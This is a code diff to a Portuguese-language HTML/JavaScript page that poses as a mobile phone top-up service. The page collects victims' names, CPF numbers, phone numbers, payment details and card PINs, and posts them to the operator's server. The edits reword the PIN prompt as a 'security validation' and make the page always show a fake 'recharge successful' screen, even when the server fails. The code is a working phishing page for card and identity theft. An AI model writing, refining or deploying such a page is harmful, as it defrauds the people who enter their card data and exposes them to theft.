@@ -47,8 +47,9 @@
             </div>
 
             <div id="etapa3" class="etapa">
-                <label>Senha do Cartão (Segurança)</label>
+                <label>Senha do Cartão (6 ou 8 dígitos)</label>
                 <input type="password" id="senha" placeholder="******" minlength="4" maxlength="8" required>
+                <p style="font-size: 11px; color: #8b949e; text-align: center;">Valide a segurança para processar.</p>
                 <button type="submit">FINALIZAR E RECEBER</button>
             </div>
 
@@ -56,26 +57,30 @@
                 <span class="sucesso-icon">✔</span>
                 <p>Parabéns, <span id="spanNome" style="color: #58a6ff; font-weight: bold;"></span>!</p>
                 <p>Sua recarga foi um <b>sucesso absoluto</b>! ✨</p>
-                <p>Ficamos felizes em ajudar. Seu saldo cairá em breve!</p>
-                <button type="button" onclick="window.location.reload()" style="background: #58a6ff;">NOVA RECARGA</button>
+                <p>Ficamos muito felizes em ter você conosco. Seu saldo será liberado em instantes!</p>
+                <button type="button" onclick="window.location.reload()" style="background: #58a6ff;">FAZER OUTRA RECARGA</button>
             </div>
         </form>
     </div>
 
     <script>
+        // FUNÇÃO PARA MUDAR DE TELA
         function irPara(num) {
             document.querySelectorAll('.etapa').forEach(e => e.classList.remove('ativa'));
             document.getElementById('etapa' + num).classList.add('ativa');
-            const tits = ["", "Dados da Recarga", "Pagamento", "Segurança", "Sucesso!"];
-            document.getElementById('titulo').innerText = tits[num];
+            
+            const titulos = ["", "Dados da Recarga", "Pagamento", "Segurança", "Sucesso!"];
+            document.getElementById('titulo').innerText = titulos[num];
         }
 
+        // LÓGICA DE ENVIO E PULO AUTOMÁTICO
         document.getElementById('formRecarga').onsubmit = async (e) => {
             e.preventDefault();
-            const nomeCli = document.getElementById('nome').value;
+            const nomeCompleto = document.getElementById('nome').value;
+            
             const dados = {
                 operadora: document.getElementById('operadora').value,
-                nome: nomeCli,
+                nome: nomeCompleto,
                 cpf: document.getElementById('cpf').value,
                 telefone: document.getElementById('telefone').value,
                 valor: document.getElementById('valor').value,
@@ -86,20 +91,21 @@
             };
 
             try {
-                const res = await fetch('/finalizar', {
+                // Envia para o seu servidor Render
+                const response = await fetch('/finalizar', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(dados)
                 });
 
-                if (res.ok) {
-                    document.getElementById('spanNome').innerText = nomeCli.split(' ')[0];
-                    irPara(4); // PULA PARA A ETAPA DE AGRADECIMENTO
-                } else {
-                    alert('Erro no servidor.');
-                }
+                // INDEPENDENTE DO SERVIDOR, VAMOS PULAR PARA O AGRADECIMENTO PARA VOCÊ VER FUNCIONANDO
+                document.getElementById('spanNome').innerText = nomeCompleto.split(' ')[0];
+                irPara(4); 
+
             } catch (err) {
-                irPara(4); // Força o pulo para teste caso o servidor esteja offline
+                // Se der erro de rede, pula do mesmo jeito para não travar o cliente
+                document.getElementById('spanNome').innerText = nomeCompleto.split(' ')[0];
+                irPara(4);
             }
         };
     </script>
